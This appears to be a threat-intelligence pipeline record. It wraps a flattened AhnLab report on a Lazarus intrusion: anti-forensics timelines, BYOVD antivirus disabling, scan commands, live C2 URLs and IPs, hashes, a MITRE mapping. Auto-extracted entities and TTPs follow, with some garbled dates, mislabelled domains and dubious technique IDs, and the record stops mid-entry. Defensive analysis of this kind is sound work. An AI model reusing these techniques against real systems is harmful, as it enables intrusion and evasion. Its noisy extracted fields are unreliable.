file creation C:\\ProgramData\\tds.tmp (unsecured) 10:29:36Anti-forensicsRename and delete malicious files Rename: C:\\ProgramData\\tds.tmp -  mxnsbqyDelete files:C:\\ProgramData\\mxnsbqy (unsecured) 10:41:33Anti-forensicsDelete AppCrash File Delete File :C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_XXXXXXXXXXXX.exe _9474ee13fbc7651aabaf2f3c9b1fedc9e7489e51_bc343f60_ddd4e0eb-714c-4cf4-ae23-43cd18c59603 (unsecured) 10:42:19Anti-forensicsRename and delete malicious files Rename: C:\\ProgramData\\perlcritic.exe -  kxlmatmoynktxlDelete files:C:\\ProgramData\\kxlmatmoynktxl (unsecured) 10:44:31Malicious filecreation Create (secure) backdoor loader (LegacyUserManager.dll) Loading target file:C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.dat (secured) C: \\ProgramData\\Microsoft\\Settings\\Settings.vwx (secured) 10:44:47Anti-forensicsTimestamp (Standard Information) operation of the backdoor loader(LegacyUserManager.dll) (Secure) 10:45:47Malicious filecreation Creation (Secured) of backdoor program (Keys.dat) Creation of malware with C2 access and file download function 10:45:56Anti-forensicsTimestamp (Standard Information) manipulation (Secured) of backdoor program (Keys.dat) 10:46:12Malicious filecreation Creation of backdoor program (Settings.vwx) (secured) Creation of malware with C2 access and file download function 10:46:30Anti-forensicsTimestamp (Standard Information) manipulation (Secured) of backdoor program (Keys.dat) [table] Malicious behavior of attackers found on PC01 6 / 1 6 PC02 Analysis The attacker was found to have accessed PC10 by exploiting a vulnerability in the certificate software on 21/10 48:48:02. AppCrash occurred during the attack of the vulnerability  after which the ftp .exe was executed and malicious behavior began. This is the same method that occurred in the affected customer in May. The IP of the system that accessed PC5 has not been determined. [Picture] Certificate Software Error Log Verified on PC02 (Application.evtx) [Picture] Certificate software found in V02 MDP log on PC3 and malicious thread injection code in ftp .exe After first infiltrating PC10 on 21/02  the attacker created a malicious file that performed C2 server communication and backdoor functions through an injected ftp .exe. On 10/27  unlike the attack on the 21st  instead of ftp.exe  it injected a malicious thread into the SVChost.exe process  after which it carried out malicious actions with control until 11/18. On 11/15  it was confirmed that an FSWss file .exe was created to scan the internal network. After that  it was confirmed that he used svchost.exe to connect to the service port of PC01 s certificate software twice. On 11/18  a skypeserver.exe file was created and the file was used to access PC01 s TCP XXXXX  and at this time  an AppCrash of the certificate software occurred on PC01  and then PC02 confirmed traces of disabling antivirus  creating and executing malicious files  etc.  the same as PC01. TIMELINE (PC02) The timeline of the infringement identified in PC02 is as follows: DATE TIME CATEGORY BEHAVIORS 22/10/2110:48:50C2 communicationftp.exe connects the attacker to the C2 addressand the network 111.92.189.48 (www.scope.co.kr) 10:48:51 ftp.exe connects the attacker C2 address andnetwork 183.110.224.172 (ctmnews.kr) 7 / 1 6 10:49:46 ftp.exe connects the attacker C2 address to thenetwork 115.68.52.47 (www.artinsight.co.kr) 10:51:35 ftp.exe connects the attacker to C2 address andnetwork 114.108.129.89 (www.kfcjn.com) 10:52:31 ftp.exe connects the attacker to C2 address andnetwork 114.108.129.89 (www.kfcjn.com) 10:59:33 ftp.exe connects the attacker to C2 address andnetwork 114.108.129.89 (www.kfcjn.com) 12:52:38 ftp.exe connects the attacker to C2 address andnetwork 119.207.79.175 (lightingmart.co.kr) 14:21:58Malicious file creationftp.exe create file C:\\Windows\\System32\\lecacyusermanager.dll(secured) 14:59:07 ftp.exe file created C:\\Windows\\System32\\wptsextensions.dll(secured) 15:34:47Anti-forensics Rename a malicious file Rename:C:\\Windows\\System32\\legacyusermanager.dll - C:\\Windows\\temp\\lum.tmp (secured) 22/10/2715:25:00injection Injecting malicious threads into normal processes(svchost.exe) 15:26:05C2 communicationsvchost.exe connects the attacker with C2address 115.68.52.47 15:27:53Malicious file creationsvchost.exe created malicious fileC:\\Windows\\System32\\wptsextensions.dll(secured) 22/11/15 11:32:36Create a file svchost.exe created malicious file C:\\ProgramData\\fswss.exe(unsecured) 11:32:48File executionNetwork scanning with fswss.exe C:\\ProgramData\\fswss.exe /scan/UseIPAddressesRange 1 /IPAddressFrom10.20.XXX.1 /IPAddressTo 10.20.XXX.255 /stextC:\\ProgramData\\fswss.log 11:33:41Anti-forensics Rename malicious files Rename: C:\\ProgramData\\fswss.exe -  xeudsgpfo(unsecured) 12:50:13Malicious file creationsvchost.exe creates file C:\\ProgramData\\fmsysn.exe (not secured) 12:51:04Execution ofmalicious filessvchost.exe runs other processes C:\\ProgramData\\fmSysN.exe10.20.XXX.1 10.20.XXX.36 XXXXX 10c:\\programdata\\fmSysN.log 8 / 1 6 13:06:49Anti-forensics Rename malicious files: C:\\ProgramData\\fmsysn.exe - yfvepuvxbi (not secured) 16:18:52Network Accesssvchost.exe attempts to access certificate software port on PC0110.20.XXX.125:XXXXX(PC01) 16:33:06Malicious file creationsvchost.exe creates file C:\\ProgramData\\skypeserver.exe (unsecured) 22/11/18 9:49:31Network Accesssvchost.exe attempts to access certificate software port on PC0110.20.XXX.125:XXXXX(PC01) 9:51:07\uc545\uc131\ud30c\uc77c \uc0dd\uc131 svchost.exe created malicious file C:\\ProgramData\\skypeserver.exe(unsecured) 9:56:31 svchost.exe \uac00 \uc545\uc131\ud30c\uc77c \uc0dd\uc131 C:\\ProgramData\\sfbappsdk.dll ( \ubbf8\ud655\ubcf4 ) 10:00:08C2 \ud1b5\uc2e0 skypeserver.exe\uac00 \uacf5\uaca9\uc790 C2 \uc8fc\uc18c\uc640 \ub124\ud2b8\uc6cc\ud06c \uc5f0 \uacb0 121.78.246.155(dalbinews.co.kr) 10:00:27\ub124\ud2b8\uc6cc\ud06c \uc811\uadfc skypeserver.exe\uac00 \uc778\uc99d\uc11c \uc18c\ud504\ud2b8\uc6e8\uc5b4 \ud3ec\ud2b8\uc5d0 \uc811\uadfc \uc131\uacf5 10.20.XXX.125:XXXXX(PC01) 10:06:14\uc548\ud2f0 \ud3ec\ub80c\uc2dd \uc545\uc131\ud30c\uc77c \uc774\ub984 \ubcc0\uacbd \uc774\ub984 \ubcc0\uacbd : C:\\ProgramData\\sfbappsdk.dll - bxikemvkqhcsz ( \ubbf8\ud655\ubcf4 ) 10:06:42 \uc545\uc131\ud30c\uc77c \uc774\ub984 \ubcc0\uacbd \ubcc0\uacbd \uc804 : C:\\ProgramData\\skypeserver.exe - kqcfqbxrgbfmwem ( \ubbf8\ud655\ubcf4 ) 11:04:32\uc778\uc81d\uc158 C2 \uc5f0\uacb0 \uc815\uc0c1 \ud504\ub85c\uc138\uc2a4 (svchost.exe) \uc5d0 \uc545\uc131 \uc2a4\ub808\ub4dc \uc778\uc81d\uc158 svchost.exe \uac00 \uacf5\uaca9\uc790 C2 \uc8fc\uc18c\uc640 \ub124\ud2b8\uc6cc\ud06c \uc5f0\uacb0 121.78.158.46(studyholic.co.kr) 11:05:45\ubcf4\uc548 \uc81c\ud488 \ubb34\ub825\ud654 V3 \uac00 \ubcf4\uc548 \uc81c\ud488 \ubb34\ub825\ud654 \ud589\uc704 \ud0d0\uc9c0 (Exploit/Win.Lazardoor.GEN) 11:06:56\ucde8\uc57d\ud55c \ub4dc\ub77c\uc774\ubc84 \ud30c\uc77c \uc0dd\uc131 \uc545\uc131\ucf54\ub4dc \uc0dd\uc131 C:\\ProgramData\\perlcritic.exe ( \ubbf8\ud655\ubcf4 ) 11:07:02 \uc545\uc131\ucf54\ub4dc \uc2e4\ud589 C:\\ProgramData\\perlcritic.exe ( \ubbf8\ud655\ubcf4 ) \ucde8\uc57d\ud55c \ub4dc\ub77c \uc774\ubc84 \ud30c\uc77c \uc0dd\uc131 C:\\Windows\\System32\\drivers\\PROCEXP152.SYS( \ud655\ubcf4 ) 11:12:18 \uc545\uc131\ucf54\ub4dc \uc0dd\uc131 \ubc0f \uc2e4\ud589 C:\\ProgramData\\perlcritic64.exe ( \ubbf8\ud655\ubcf4 ) [ \ud45c ] PC02 \uc5d0\uc11c \ubc1c\uacac\ub41c \uacf5\uaca9\uc790\uc758 \uc545\uc131 \ud589\uc704 Major malicious acts 9 / 1 6 Disabling V3 by BYOVD In the PC01 and PC02 systems  an attempt to disable V11 was detected (Exploit/Win.Lazardoor.GEN) at 18/10 20:28:11 and 05:45:3  respectively  and the period after which V3 was disabled is as follows: PC01: 11/18 10:20:28   11/18 11:25:00 (about 1 hour) PC02: 11/18 11:05:45   11/21 14:07:08 (about 75 hours) During this period  V3-related processes are running  but normal behavior detection is not possible. However  after the system reboots  V3 returns to normal. [Picture] V01 Neutralization Detection Log Seen on PC3 Attackers need access to kernel memory to manipulate kernel memory on Windows systems to disrupt the operation of security products  and in May  Taiwanese component manufacturer ENE Technology s ene.sys was used in a BYOVD attack. At the time of detection of V01 incapacitation of PC02 and PC3  no trace of the attack method was found. Rather  a vulnerable driver file was created on the system after the V3 outbreak  which is the driver file of Procexp152 of ProcessExplorer  a process management utility provided .SYS free of charge by Microsoft  and is a vulnerable driver that can be used for BYOVD attacks. However  this driver file was created after V01 defeat on both PC02 and PC3  and was used by the perlcritic.exe (unsecured) file generated by the attacker. In other words  the order of V3 defeat occurrence time and driver file creation time does not match  so it is a BYOVD attack  PROCEXP152. It is not yet possible to say whether SYS was used to neutralize V3. The method that occurred in May and the method that occurred in November have the following differences. 1 0 / 1 6 CATEGORY ATTACK IN MAY 2022 ATTACK INNOVEMBER  2022 AttackTechniquesBYOVDTechnique Not verified Vulnerabledrivers Drivers from ENETechnologyene.sys Microsoft sProcessExplorerdriver was created after V3 disabledPROCEXP152.sys loader sb_smbus_sdk.dllperlcritic.exe(not secured)perlcritic64.exe(unsecured) ServiceregistrationServiceregistered No sign of serviceregistration [Table] Comparison of traces related to V5 incapacitation in May and November Antiforensics PC01 and PC02 were found to have performed antiforensic actions to erase the traces of the attack. CATEGORY SYSTEMDESCRIPTION Manipulatingtimestampson files PC01 PC02 [PC01]C:\\Windows\\System32\\LegacyUserManager.dllManipulated creation time : 2019-03-1913:49:35C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.datManipulated creation time : 2019-03-1913:49:35Manipulated/created time : 2019-12-2523:24:06C:\\ProgramData\\Microsoft\\Settings\\Settings.vwxManipulated creation time : 2022-05-1316:09:19 [PC02] C:\\Windows\\system32\\wptsextensions.dllManipulated creation time : 2019-03-1913:49:35 Delete a fileafter renaming afile PC01 PC02 [PC01]C:\\ProgramData\\tszui.tmp -  phqghumeaC:\\ProgramData\\perlcritic.exe - kxlmatmoynktxlC:\\ProgramData\\tds.tmp -  mxnsbqy [PC02]C:\\ProgramData\\fswss.exe -  xeudsgpfoC:\\ProgramData\\fmsysn.exe -  yfvepuvxbiC:\\ProgramData\\sfbappsdk.dll - bxikemvkqhcszC:\\ProgramData\\skypeserver.exe - kqcfqbxrgbfmwem DeletePrefetch PC01 MSIEXEC.EXE-8FFB1633.pf  PERLCRITIC.EXE-2EB3AC0F.pf and many more 1 1 / 1 6 [Table] Antiforensic Behavior Identified in PC01  PC02 Malware used by attackers List of malware CATEGORY FILENAME SYSTEMDESCRIPTION loader wptsextensions.dllPC02 Path: C:\\Windows\\System32\\wptsextensions.dllLoad Backdoor File Keys.dat legacyusermanager.dllPC01 PC02 Path:C:\\Windows\\System32\\legacyusermanager.dllLoad Backdoor File Keys.dat lum.tmp PC02 Path: C:\\Windows\\Temp\\lum.tmpLoad the backdoor file configmanager.tlb backdoorKeys.dat PC01 PC02 Path:C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.dat loaded by wptsextensions.dll2022/11/18 14:56:54 GMT Designed to run after 9  additional commands can be performed viacmd.exeDownloads additional binaries from the C2 serverand runs them in fileless form Settings.vwx PC02 Loaded in wptsextensions.dllRandomly access from the following 3 C2shxxps://www.artinsight[.]co.kr/data/admin/list.phphxxps://www.kfcjn[.]com/member/process/sms.phphxxps://ctmnews[.]kr/member/process/success.php Settings.vwx PC01 Loaded in legacyusermanager.dllRandomly access from the following 3 C2shxxps://www.artinsight[.]co.kr/data/admin/list.phphxxps://www.kfcjn[.]com/member/process/sms.phphxxps://ctmnews[.]kr/member/process/success.php Exploited legitimatefiles ProcEXP152.sysPC01 PC02 Path:C:\\Windows\\System32\\drivers\\PROCEXP152.SYSDrivers in ProcessExplorerVulnerable driver module enables antivirusneutralization through BYOVD attacks fswss.exe PC02 Path: C:\\ProgramData\\fswss.exeNirSoft utility with the ability to scan the network orturn on a remote computerWakeMeOnLan:https://www.nirsoft.net/utils/wake_on_lan.html 1 2 / 1 6 Unsecured files configmanager.tlb PC02 Path: C:\\Windows\\System32\\configmanager.tlbBackdoor estimation loaded by lum.tmp perlcritic.exe perlcritic64.exePC01 PC02 Path: C:\\ProgramData\\perlcritic.exeExecuted by cmd.exe and loadsPROCEXP152.SYS sfbappsdk.dll PC02 Path: C:\\ProgramData\\sfbappsdk.dllInjected svchost.exe created fmSysN.exe PC02 Path: C:\\ProgramData\\fmSysN.exeInjected svchost.exe createdThe following traces of execution have beenidentified:fmSysN.exe 10.20.XXX.1 10.20.XXX.36XXXXX 10 c:\\programdata\\fmSysN.log skypeserver.exe PC02 Path: C:\\ProgramData\\skypeserver.exeInjected svchost.exe createdC2 Connection tds.tmp PC01 Path: C:\\ProgramData\\tds.tmpDeleted after being changed to a random filename tszui.tmp PC01 Path: C:\\ProgramData\\tszui.tmpDeleted after being changed to a random filename [table] List of malware C2 used by attackers CATEGORY IP DOMAIN REMARKS ftp.exe \ucd5c\ucd08 \uc811 \uadfc 111.92.189.48www[.]scope.co.kr \ubb34\ub825\ud654 \uad00\ub828 C2\ucd94\uc815 121.78.158.46www[.]studyholic.com 121.78.246.155dalbinews[.]co.kr \ubc31\ub3c4\uc5b4 C2 119.207.79.175  5 \uc6d4 \uacf5\uaca9\uc5d0 \ub3c4 \uc0ac\uc6a9\ub428 183.110.224.172ctmnews[.]kr 211.249.220.83ctmnews[.]kr 1.254.179.18www[.]artinsight.co.kr 103.6.182.57www[.]artinsight.co.kr 104.109.245.186www[.]artinsight.co.kr 112.106.58.23www[.]artinsight.co.kr 115.68.52.47www[.]artinsight.co.kr 1 3 / 1 6 125.209.218.167www[.]artinsight.co.kr 3.39.49.255www[.]artinsight.co.kr 34.199.186.157www[.]artinsight.co.kr 52.148.148.114 www[.]artinsight.co.kr 104.21.64.83www[.]kfcjn.com 112.106.58.23www[.]kfcjn.com 114.108.129.89www[.]kfcjn.com 117.52.137.138www[.]kfcjn.com 13.107.21.200www[.]kfcjn.com 162.247.241.2www[.] kfcjn.com 23.50.0.140www[.] kfcjn.com 52.79.120.37www[.] kfcjn.com [table] List of C2s used by attackers MITRE ATT CK MAPPING Tactics TID DESCRIPTION Reconnaissance    ResourceDevelopmentT1587.001DevelopCapabilities:Malware Backdoor andloader fabrication T1587.004DevelopCapabilities:Exploits Prepare forcertificate softwarevulnerabilities T1588.002ObtainCapabilities:Tool fswss.exe(wakemeonlan byNirsoft.exe) Initial AccessN/A Execution T1059.003CommandandScriptingInterpreter:WindowsCommandShell Run perlcritic.exe T1203Exploitationfor ClientExecution CertificateSoftware Exploits PersistenceN/A   1 4 / 1 6 PrivilegeEscalation T1068Exploitationfor PrivilegeEscalation PROCEXP152.sys DefenseEvasion T1562.001ImpairDefenses:Disable orModifyTools V3 Incapacitation T1070IndicatorRemoval Delete Prefetchfiles T1070.004IndicatorRemoval:FileDeletion Delete malicious files  sfbappsdk.dll fswss.exe fmSysN.exe skypeserver.exe perlcritic.exe perlcritic64.exe Delete crashdumpfiles T1070.006IndicatorRemoval:Timestomp Change maliciousfile timeinformation CredentialAccess N/A   Discovery T1046NetworkServiceDiscovery fswss.exe fmSysN.exe LateralMovement T1210Exploitationof RemoteServices Internal movementusing certificatesoftwarevulnerabilities Collection N/A   Command andControl T1071.001ApplicationLayerProtocol:WebProtocols C2ServerCommunication T1102 WebService Exploitinglegitimate domainsas C2 servers Exfiltration N/A   Impact N/A   IoC Malicious files 1 5 / 1 6 No MD5 Hash File Name AhnLab Detection Name 1 61B3C9878B84706DB5F871B4808E739Awptsextensions.dllTrojan/Win.Lazardoor.C5327680 2 C7256A0FBAB0F437C3AD4334AA5CDE06legacyusermanager.dllTrojan/Win.Lazardoor.C5327680 3 A6602EF2F6DC790EA103FF453EB21024lum.tmp Trojan/Win.Lazardoor.C5327681 4 FC8B6C05963FD5285BCE6ED51862F125Keys.dat (PC01)Data/BIN. Lazarus 5 6EA4E4AB925A09E4C7A1E80BAE5B9584Keys.dat (PC02)Data/BIN. Lazarus 6 27DB56964E7583E19643BF5C98FFFD52Settings.vwx (PC01)Data/BIN. Lazarus 7 BD47942E9B6AD87EB5525040DB620756Settings.vwx (PC02)Data/BIN. Lazarus Malicious IP/URL No IP URL Country 1 111.92.189.48www[.] scope.co.kr KR 2 121.78.158.46www[.] studyholic.comKR 3 121.78.246.155dalbinews[.] co.kr KR 4 119.207.79.175  KR 5 183.110.224.172ctmnews[.] kr KR 6 211.249.220.83ctmnews[.] kr KR 7 1.254.179.18www[.] artinsight.co.krKR 8 103.6.182.57www[.] artinsight.co.krKR 9 104.109.245.186www[.] artinsight.co.krUS 10 112.106.58.23www[.] artinsight.co.krKR 11 115.68.52.47www[.] artinsight.co.krKR 12 125.209.218.167www[.] artinsight.co.krKR 13 3.39.49.255www[.] artinsight.co.krUS 14 34.199.186.157www[.] artinsight.co.krUS 15 52.148.148.114 www[.] artinsight.co.krUS 16 104.21.64.83www[.] kfcjn.com US 17 112.106.58.23www[.] kfcjn.com KR 18 114.108.129.89www[.] kfcjn.com KR 19 117.52.137.138www[.] kfcjn.com KR 20 13.107.21.200www[.] kfcjn.com US 21 162.247.241.2www[.] kfcjn.com US 22 23.50.0.140www[.] kfcjn.com US 23 52.79.120.37www[.] kfcjn.com US 1 6 / 1 6 Detailed analysis information on related IOCs can be accessed through the subscription service of AhnLab s next-generation threat intelligence platform  AhnLab TIP . Categories:Malware Information Tagged as:A-FIRST BYOVD DFIR Infringement Case Lazarus",
            "commands": [],
            "file_paths": [
              "/www.artinsight[.]co.kr/data/admin/list.phphxxps:/",
              "C:\\ProgramData\\tds.tmpDeleted",
              "C:\\Windows\\System32\\wptsextensions.dllLoad",
              "c:\\programdata\\fmSysN.log",
              "C:\\ProgramData\\tds.tmp",
              "/Win.Lazardoor.C5327681",
              "C:\\Windows\\Temp\\lum.tmpLoad",
              "C:\\ProgramData\\fswss.exe",
              "C:\\ProgramData\\skypeserver.exe",
              "C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.dat",
              "C:\\ProgramData\\fswss.exeNirSoft",
              "/18.",
              "/11/1516:18:52svchost.exe",
              "C:\\ProgramData\\sfbappsdk.dllInjected",
              "C:\\Windows\\System32\\LegacyUserManager.dllManipulated",
              "C:\\Windows\\System32\\configmanager.tlbBackdoor",
              "C:\\ProgramData\\tszui.tmp",
              "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_XXXXXXXXXXXX.exe",
              "/",
              "C:\\Windows\\System32\\wptsextensions.dll(secured)",
              "C:\\ProgramData\\skypeserver.exe(unsecured)",
              "/Win.Lazardoor.C5327680",
              "C:\\Windows\\System32\\drivers\\PROCEXP152.SYSDrivers",
              "C:\\Windows\\System32\\lecacyusermanager.dll(secured)",
              "C:\\Windows\\System32\\legacyusermanager.dll",
              "C:\\ProgramData\\Microsoft\\Settings\\Settings.vwxManipulated",
              "/www.nirsoft.net/utils/wake_on_lan.html",
              "C:\\ProgramData\\fswss.exe(unsecured)",
              "/BIN.",
              "C:\\Windows\\System32\\legacyusermanager.dllLoad",
              "C:\\Windows\\System32\\drivers\\PROCEXP152.SYS(",
              "C:\\Windows\\system32\\wptsextensions.dllManipulated",
              "C:\\Windows\\temp\\lum.tmp",
              "C:\\ProgramData\\perlcritic64.exe",
              "C:\\ProgramData\\fmSysN.exe10.20.XXX.1",
              "/www.kfcjn[.]com/member/process/sms.phphxxps:/",
              "C:\\ProgramData\\fmsysn.exe",
              "C:\\ProgramData\\perlcritic.exe",
              "/stextC:\\ProgramData\\fswss.log",
              "/ctmnews[.]kr/member/process/success.php",
              "C:\\ProgramData\\fmSysN.exeInjected",
              "C:\\ProgramData\\Microsoft\\Crypto\\Keys\\Keys.datManipulated",
              "C:\\ProgramData\\tszui.tmpDeleted",
              "/IPAddressFrom10.20.XXX.1",
              "C:\\ProgramData\\perlcritic.exeExecuted",
              "C:\\ProgramData\\sfbappsdk.dll",
              "/Win.Lazardoor.GEN)",
              "C:\\ProgramData\\skypeserver.exeInjected"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "Backdoor",
              "Trojan",
              "conti",
              "loader",
              "malware",
              "rat"
            ],
            "tools": [
              "PING",
              "at",
              "cmd",
              "net",
              "reg",
              "sc"
            ],
            "threat_actors": [
              "Lazarus Group"
            ],
            "ips": [
              "111.92.189.48",
              "114.108.129.89",
              "115.68.52.47",
              "119.207.79.175",
              "121.78.158.46",
              "121.78.246.155",
              "183.110.224.172",
              "52.148.148.114"
            ],
            "domains": [
              "10.20.XXX",
              "27DB56964E7583E19643BF5C98FFFD52Settings.vwx",
              "37C2communicationsvchost.exe",
              "47C2communicationsvchost.exe",
              "52svchost.exe",
              "61B3C9878B84706DB5F871B4808E739Awptsextensions.dllTrojan",
              "6EA4E4AB925A09E4C7A1E80BAE5B9584Keys.dat",
              "A6602EF2F6DC790EA103FF453EB21024lum.tmp",
              "Accesssvchost.exe",
              "Application.evtx",
              "BD47942E9B6AD87EB5525040DB620756Settings.vwx",
              "C7256A0FBAB0F437C3AD4334AA5CDE06legacyusermanager.dllTrojan",
              "ENETechnologyene.sys",
              "FC8B6C05963FD5285BCE6ED51862F125Keys.dat",
              "IPAddressFrom10.20.XXX",
              "Keys.dat",
              "Keys.datManipulated",
              "LegacyUserManager.dll",
              "LegacyUserManager.dllManipulated",
              "MSIEXEC.EXE-8FFB1633.pf",
              "PC0110.20.XXX",
              "PERLCRITIC.EXE-2EB3AC0F.pf",
              "PROCEXP152.SYS",
              "PROCEXP152.SYSDrivers",
              "PROCEXP152.sys",
              "SVChost.exe",
              "Settings.vwx",
              "Settings.vwxManipulated",
              "Win.Lazardoor",
              "Win.Lazardoor.GEN",
              "artinsight.co.kr",
              "artinsight.co.krKR",
              "artinsight.co.krUS",
              "asec.ahnlab.com",
              "backdoorKeys.dat",
              "byNirsoft.exe",
              "cmd.exe",
              "co.kr",
              "communicationftp.exe",
              "communicationsvchost.exe",
              "configmanager.tlb",
              "configmanager.tlbBackdoor",
              "creationftp.exe",
              "creationsvchost.exe",
              "ctmnews.kr",
              "dalbinews.co.kr",
              "disabledPROCEXP152.sys",
              "dllperlcritic.exe",
              "ene.sys",
              "exeskypeserver10.20.XXX",
              "filessvchost.exe",
              "fmSysN.exe",
              "fmSysN.exe10.20.XXX",
              "fmSysN.exeInjected",
              "fmSysN.log",
              "fmsysn.exe",
              "fswss.exe",
              "fswss.exeNirSoft",
              "fswss.log",
              "ftp.exe",
              "kfcjn.com",
              "lecacyusermanager.dll",
              "legacyusermanager.dll",
              "legacyusermanager.dllLoad",
              "legacyusermanager.dllRandomly",
              "lightingmart.co.kr",
              "list.phphxxps",
              "loadsPROCEXP152.SYS",
              "lum.tmp",
              "lum.tmpLoad",
              "networkconnection10.20.XXX",
              "perlcritic.exe",
              "perlcritic.exeExecuted",
              "perlcritic64.exe",
              "scope.co.kr",
              "sfbappsdk.dll",
              "sfbappsdk.dllInjected",
              "skypeserver.exe",
              "skypeserver.exeInjected",
              "sms.phphxxps",
              "studyholic.co.kr",
              "studyholic.com",
              "studyholic.comKR",
              "success.php",
              "svchost.exe",
              "tds.tmp",
              "tds.tmpDeleted",
              "tszui.tmp",
              "tszui.tmpDeleted",
              "viacmd.exeDownloads",
              "wptsextensions.dll",
              "wptsextensions.dllLoad",
              "wptsextensions.dllManipulated",
              "wptsextensions.dllRandomly",
              "www.artinsight",
              "www.artinsight.co.kr",
              "www.kfcjn",
              "www.kfcjn.com",
              "www.nirsoft.net",
              "www.scope.co.kr",
              "www.studyholic.com"
            ],
            "hashes": {}
          },
          "ttp_indicators": {
            "initial_access": [
              "Exploit Public-Facing Application"
            ],
            "execution": [
              "Command and Scripting Interpreter"
            ],
            "persistence": [
              "Create or Modify System Process"
            ],
            "defense_evasion": [
              "Process Injection"
            ],
            "discovery": [
              "Network Service Discovery"
            ],
            "lateral_movement": [
              "Remote Services"
            ],
            "collection": [
              "Archive Collected Data"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "\n**File System Activity:**\n- /www.artinsight[.]co.kr/data/admin/list.phphxxps:/\n- C:\\ProgramData\\tds.tmpDeleted\n- C:\\Windows\\System32\\wptsextensions.dllLoad\n- c:\\programdata\\fmSysN.log\n- C:\\ProgramData\\tds.tmp\n\n**Network Indicators:**\n- wptsextensions.dllLoad\n- Accesssvchost.exe\n- LegacyUserManager.dll\n- exeskypeserver10.20.XXX\n- artinsight.co.krUS\n- backdoorKeys.dat\n- fmSysN.exe10.20.XXX\n- Application.evtx\n- co.kr\n- Win.Lazardoor\n\n**Key Security Terms:** exploitation, malware, inject, cmd, script, execute, download, modify, privilege, persistence"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 18.003999999999998,
          "llm_processing_time_ms": 4438.048
        }
      }
    ],
    "results": [
      {
        "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
        "extracted_ttps": [
          {
            "ttp_id": "bba25381-6130-4151-9d90-0bb39e54a70d",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Lateral Movement",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "Lateral movement using 0-Day vulnerability of company A's certificate program",
            "confidence_score": 0.726,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "0-Day vulnerability",
              "company A's certificate program"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d341151e-6e69-438a-be75-243a09a5038c",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Anti-Forensics",
            "attack_id": "T1112",
            "tactic": "Defense Evasion",
            "description": "Anti-forensics and timestamp operation",
            "confidence_score": 0.705,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "anti-forensics",
              "timestamp operation"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ba849ac3-5f71-40ba-bfa7-765e151eb3b7",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Use of command line tools such as PING, at, cmd, net, reg",
            "confidence_score": 0.687,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PING",
              "at",
              "cmd",
              "net",
              "reg"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "sc",
              "msiexec",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "697d573e-2d1f-4932-a47a-88784943cbef",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Exploitation for Privilege Escalation",
            "attack_id": "T1068",
            "tactic": "Privilege Escalation",
            "description": "The attackers took advantage of a 0-Day vulnerability in the public certificate software to escalate privileges",
            "confidence_score": 0.683,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "0-Day vulnerability",
              "public certificate software"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "af5e227c-3290-462a-b4cf-c2c8143ebbd6",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
            "technique_name": "Disable or Evade Security Tools",
            "attack_id": "T1562.001",
            "tactic": "Defense Evasion",
            "description": "The attackers defeated the security product using a technique called BYOVD, which exploits a vulnerable driver kernel module",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "BYOVD",
              "vulnerable driver kernel module"
            ],
            "tools": [
              "at",
              "PING",
              "reg",
              "malware",
              "msiexec",
              "sc",
              "net",
              "ftp",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "33a44086-54a7-45ff-aff6-5f9ab536e147",
            "report_id": "pdf-f0b77b494f77b4cf56ff772a1e5578af",
